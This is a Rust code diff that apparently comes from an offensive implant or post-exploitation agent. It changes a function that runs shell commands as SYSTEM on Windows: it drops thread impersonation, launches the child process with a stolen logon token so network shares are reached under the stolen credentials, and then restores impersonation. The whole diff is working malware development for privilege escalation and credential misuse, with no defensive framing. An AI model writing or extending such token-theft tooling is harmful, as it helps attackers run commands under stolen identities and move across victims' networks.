@@ -213,6 +213,20 @@ unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
     let mut wargs = to_wide(&shell_args);
     let mut wargs_as_user = to_wide(&shell_args);
 
+    // Drop any thread impersonation (from make-token LOGON_NEW_CREDENTIALS) so
+    // the process primary token (SYSTEM) provides SeAssignPrimaryTokenPrivilege
+    // for CreateProcess*W.  Restore the impersonation after the child is started.
+    let mut saved_imp: isize = 0;
+    {
+        let mut h_thr: isize = 0;
+        if OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, 1, &mut h_thr) != 0 {
+            DuplicateTokenEx(h_thr, TOKEN_ALL_ACCESS, std::ptr::null(),
+                             SecurityImpersonation as i32, TokenImpersonation as i32, &mut saved_imp);
+            CloseHandle(h_thr);
+            RevertToSelf();
+        }
+    }
+
     let mut self_tok = 0isize;
     if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut self_tok) != 0 {
         enable_priv(self_tok, "SeImpersonatePrivilege");
@@ -261,6 +275,11 @@ unsafe fn shell_as_system(cmd: &str, token: isize) -> String {
             RevertToSelf();
         }
     }
+    // Restore thread impersonation regardless of CreateProcess outcome.
+    if saved_imp != 0 {
+        ImpersonateLoggedOnUser(saved_imp);
+        CloseHandle(saved_imp);
+    }
     if proc_ok == 0 {
         return format!("[error: SYSTEM shell launch; WithToken={}; AsUser={}; Impersonate={}]",
                        with_token_err, as_user_err, impersonate_err);
@@ -294,12 +313,13 @@ pub(crate) fn shell(cmd: &str) -> String {
     #[cfg(target_os = "windows")]
     {
         let sys_tok = G_SYSTEM_TOKEN.load(Ordering::Acquire);
-        if sys_tok != 0 {
-            return unsafe { shell_as_system(cmd, sys_tok) };
-        }
         let stolen_tok = G_STOLEN_TOKEN.load(Ordering::Acquire);
-        if stolen_tok != 0 {
-            return unsafe { shell_as_system(cmd, stolen_tok) };
+        // Prefer stolen_tok (make-token credentials) as the child's primary
+        // token so UNC network access uses those credentials rather than the
+        // machine account.  Fall back to sys_tok when stolen_tok is absent.
+        if sys_tok != 0 || stolen_tok != 0 {
+            let child_tok = if stolen_tok != 0 { stolen_tok } else { sys_tok };
+            return unsafe { shell_as_system(cmd, child_tok) };
         }
     }
 
